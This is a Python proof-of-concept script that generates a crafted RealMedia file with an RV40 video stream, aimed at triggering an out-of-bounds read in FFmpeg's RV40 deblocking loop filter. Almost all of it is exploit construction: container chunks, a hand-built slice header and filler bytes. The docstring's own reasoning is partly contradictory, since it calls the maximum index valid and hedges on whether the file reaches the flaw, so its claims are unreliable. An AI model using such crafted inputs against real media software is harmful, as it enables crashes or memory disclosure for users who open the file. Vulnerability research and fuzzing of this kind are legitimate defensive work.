#!/usr/bin/env python3
"""
PoC generator for VULN-001: OOB Read in rv40_strong_loop_filter via dmode Array Overrun
CWE-125 (Out-of-bounds Read)

This script generates a minimal RealMedia (.rm) file with an RV40 video stream
designed to trigger the strong deblocking loop filter in FFmpeg's rv40dsp.c.

The vulnerability is in rv40_strong_loop_filter() at lines 519-535:
  rv40_dither_l[dmode + i] and rv40_dither_r[dmode + i]
where dmode can be up to 12 and i goes 0..3, giving max index 15 (last valid
for arrays of size 16). When dmode=15 is passed (from the j=12,i=3 path in
the non-strong filter), indices 16-18 would be OOB.

The strong filter is triggered by:
1. Intra-coded macroblocks (IS_INTRA → mb_strong=1)
2. Adjacent intra MB boundaries force the strong (edge=1) filter path
3. The dmode parameter comes from the dither calculation in rv40_loop_filter()

Target: 160x120 I-frame with 10x8 MB grid.
Format: RealMedia container with RV40 video stream.
"""

import struct
import sys
import os

def be2(x):
    """Pack big-endian 16-bit value."""
    return struct.pack('>H', x & 0xFFFF)

def be4(x):
    """Pack big-endian 32-bit value."""
    return struct.pack('>I', x & 0xFFFFFFFF)

def make_rm_file():
    """
    Construct a minimal RealMedia file with one RV40 video stream.

    File layout:
      [.RMF header 18 bytes]
      [PROP chunk  50 bytes]
      [MDPR chunk  ~82 bytes]
      [DATA chunk header + packets]

    Video parameters:
      - Codec: RV40 (AV_CODEC_ID_RV40)
      - Width: 160, Height: 120 (10x8 MB grid)
      - Frame type: I-frame (all intra MBs)
      - Quantizer: 20

    The RV40 slice header is crafted to parse successfully:
      Bit 0:    0 (valid marker, must be 0)
      Bits 1-2: 00 (type=0, I-frame)
      Bits 3-7: 10100 (quant=20)
      Bits 8-9: 00 (reserved, must be 0)
      Bits 10-11: 00 (vlc_set=0)
      Bit 12:   0 (skip)
      Bits 13-25: 0 (pts=0, 13 bits)
      Bits 26-28: 000 (width t=0 -> 160)
      Bits 29-31: 000 (height t=0 -> 120)
      Bits 32-38: 0000000 (start_offset=0, 7 bits for mb_size=80)
      Bit 39:   1 (is16=1 for first MB: 16x16 intra)

    MB data: 0xFF bytes encourage is16=1 for all MBs since get_bits1 returns 1.
    With all-1s, VLC decoding reads the all-ones path in each table, giving
    valid (if unusual) codewords. The decoder should complete all 80 MBs.
    """

    # Video dimensions
    width = 160
    height = 120
    # MB grid: mb_width=10, mb_height=8, mb_size=80

    # =========================================================================
    # Construct the RV40 slice bitstream
    # =========================================================================
    # Slice header (39 bits across 5 bytes):
    #   Byte 0: 0 00 10100 = 0x14 (valid=0, type=0, quant=20)
    #   Byte 1: 00 00 0 000 = 0x00 (reserved=0, vlc_set=0, skip=0, pts[0-2]=0)
    #   Byte 2: 00000000 = 0x00 (pts[3-10]=0)
    #   Byte 3: 00 000 000 = 0x00 (pts[11-12]=0, width_t=0, height_t=0)
    #   Byte 4: 0000000 1 = 0x01 (start_offset[6 bits]=0, is16_for_mb0=1)
    #
    # Bytes 5+: MB data (0xFF for all-ones bit stream)
    #   - is16=1 for each MB (bit in stream = 1)
    #   - t=3 (prediction mode from top 2 bits = 11)
    #   - CBP via VLC (all-ones path in cbppattern VLC)
    #   - Coefficients (if any, decoded via VLC with all-ones)

    slice_header = bytes([0x14, 0x00, 0x00, 0x00, 0x01])

    # Large MB data buffer: 8192 bytes of 0xFF (all ones)
    # This provides 65536 bits for decoding 80 MBs.
    # Even if each MB uses ~100 bits (1 is16 + 2 t + ~8 CBP + ~40 coeff),
    # 80*100 = 8000 bits << 65536 bits available.
    mb_data = bytes([0xFF]) * 8192

    # Also try a secondary pattern: alternating 0xFF/0x00 for variety
    # (keeping all-0xFF for first attempt)

    rv40_data = slice_header + mb_data

    # =========================================================================
    # Wrap in RealMedia packet
    # =========================================================================
    # Demuxer (rm_assemble_video_frame) expects:
    #   hdr byte (type=1 = whole frame: 0x41-0x7F)
    #   seq byte (sequence number)
    #   [rv40_data len bytes]
    # And prepends 9-byte prefix before passing to decoder:
    #   [0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00] + rv40_data

    video_hdr = bytes([0x41, 0x00])  # type=1 (whole frame), seq=0
    video_payload = video_hdr + rv40_data

    # =========================================================================
    # Packet structure in DATA chunk (consumed by rm_sync):
    #   \x00\x00          object_version = 0
    #   BE2(pkt_len)      total packet length (including these 12 bytes)
    #   BE2(0)            stream number = 0
    #   BE4(0)            timestamp = 0
    #   \x00              packet group = 0
    #   \x00              flags = 0
    #   [video_payload]   the actual video data
    # =========================================================================
    pkt_len = 12 + len(video_payload)
    packet = (
        b'\x00\x00'           # object version
        + be2(pkt_len)        # total length
        + b'\x00\x00'         # stream number 0
        + b'\x00\x00\x00\x00' # timestamp = 0
        + b'\x00'             # group = 0
        + b'\x00'             # flags = 0
        + video_payload
    )

    # =========================================================================
    # Codec data for MDPR chunk
    # Structure consumed by ff_rm_read_mdpr_codecdata:
    #   outer_type (4 bytes BE): not audio magic -> use 0x00000000
    #   'VIDO' (4 bytes LE): video type marker
    #   'RV40' (4 bytes LE): codec tag
    #   width (2 bytes BE): 160
    #   height (2 bytes BE): 120
    #   bps (2 bytes, skipped)
    #   zeros (4 bytes, skipped)
    #   fps (4 bytes BE): 0 (no frame rate set)
    #   extradata (remaining bytes)
    # =========================================================================
    codec_data = (
        b'\x00\x00\x00\x00'  # outer type (not audio magic)
        + b'VIDO'             # MKTAG('V','I','D','O') in LE
        + b'RV40'             # MKTAG('R','V','4','0') in LE
        + be2(width)          # width = 160
        + be2(height)         # height = 120
        + b'\x00\x18'         # bps = 24 (ignored)
        + b'\x00\x00\x00\x00' # zeros (ignored)
        + be4(0)              # fps = 0 (no frame rate)
        + b'\x00' * 10        # extradata (10 zero bytes)
    )
    # codec_data size = 4+4+4+2+2+2+4+4+10 = 36 bytes

    # =========================================================================
    # MDPR chunk body
    # Consumed by rm_read_header case MKTAG('M','D','P','R'):
    #   id (2 bytes BE)
    #   max_bit_rate (4 bytes BE)
    #   bit_rate (4 bytes BE)
    #   max_packet_size (4 bytes BE)
    #   avg_packet_size (4 bytes BE)
    #   start_time (4 bytes BE)
    #   preroll (4 bytes BE)
    #   duration (4 bytes BE)
    #   desc (1+N bytes: length prefixed)
    #   mime (1+M bytes: length prefixed)
    #   codec_data_size (4 bytes BE)
    #   codec_data
    # =========================================================================
    mdpr_body = (
        be2(0)                 # stream id = 0
        + be4(500000)          # max bit rate
        + be4(400000)          # avg bit rate
        + be4(pkt_len + 100)   # max packet size
        + be4(pkt_len)         # avg packet size
        + be4(0)               # start time = 0
        + be4(0)               # preroll = 0
        + be4(5000)            # duration = 5 seconds
        + b'\x00'              # desc: empty (length=0)
        + b'\x00'              # mime: empty (length=0)
        + be4(len(codec_data)) # codec_data_size
        + codec_data
    )
    # mdpr_body = 2+4+4+4+4+4+4+4+1+1+4+36 = 72 bytes

    mdpr_ver = b'\x00\x00'
    mdpr_size = 4 + 4 + 2 + len(mdpr_body)  # tag+size+ver+body = 10+72=82
    mdpr_chunk = b'MDPR' + be4(mdpr_size) + mdpr_ver + mdpr_body

    # =========================================================================
    # PROP chunk
    # =========================================================================
    # data_off = offset of DATA chunk in file
    rmf_size = 18
    prop_size = 50
    data_off = rmf_size + prop_size + mdpr_size  # = 18+50+82 = 150

    prop_body = (
        be4(500000)    # max bit rate
        + be4(400000)  # avg bit rate
        + be4(pkt_len + 100)  # max packet size
        + be4(pkt_len) # avg packet size
        + be4(1)       # nb_packets = 1
        + be4(5000)    # duration = 5 seconds (ms)
        + be4(0)       # preroll = 0
        + be4(0)       # indx_off = 0 (no index)
        + be4(data_off)# data_off = 150
        + be2(1)       # nb_streams = 1
        + be2(0)       # flags = 0
    )
    # prop_body = 6*4 + 4+4+4+2+2 = 24+16 = 40 bytes
    # prop_chunk = 4+4+2+40 = 50 bytes ✓

    prop_ver = b'\x00\x00'
    prop_chunk = b'PROP' + be4(50) + prop_ver + prop_body

    # =========================================================================
    # DATA chunk
    # Header consumed at header_end:
    #   nb_packets (4 bytes BE)
    #   next_data_header (4 bytes BE)
    # =========================================================================
    data_header = (
        b'DATA'
        + be4(18)       # DATA chunk size (just the 18-byte header)
        + b'\x00\x00'   # ver = 0
        + be4(1)        # nb_packets = 1
        + be4(0)        # next_data_header = 0
    )
    data_chunk = data_header + packet

    # =========================================================================
    # .RMF header
    # The main loop reads tag+size+ver(10 bytes), then skips tag_size-8 bytes.
    # So .RMF chunk: tag(4)+size(4)+content(10) = 18 bytes total.
    # Content (10 bytes): version(2)+file_version(4)+num_headers(4) - all skipped
    # =========================================================================
    rmf_chunk = b'.RMF' + be4(18) + b'\x00' * 10

    # Assemble the complete file
    rm_file = rmf_chunk + prop_chunk + mdpr_chunk + data_chunk

    return rm_file


if __name__ == '__main__':
    outfile = 'vuln_001_input.rm'
    script_dir = os.path.dirname(os.path.abspath(__file__))
    outpath = os.path.join(script_dir, outfile)

    data = make_rm_file()
    with open(outpath, 'wb') as f:
        f.write(data)

    print(f"Generated {outpath} ({len(data)} bytes)")
    print(f"RV40 video: 160x120 pixels, I-frame, quant=20")
    print(f"MB grid: 10x8 = 80 macroblocks (all 16x16 intra)")
    print(f"Trigger: strong deblocking loop filter with INTRA MBs")
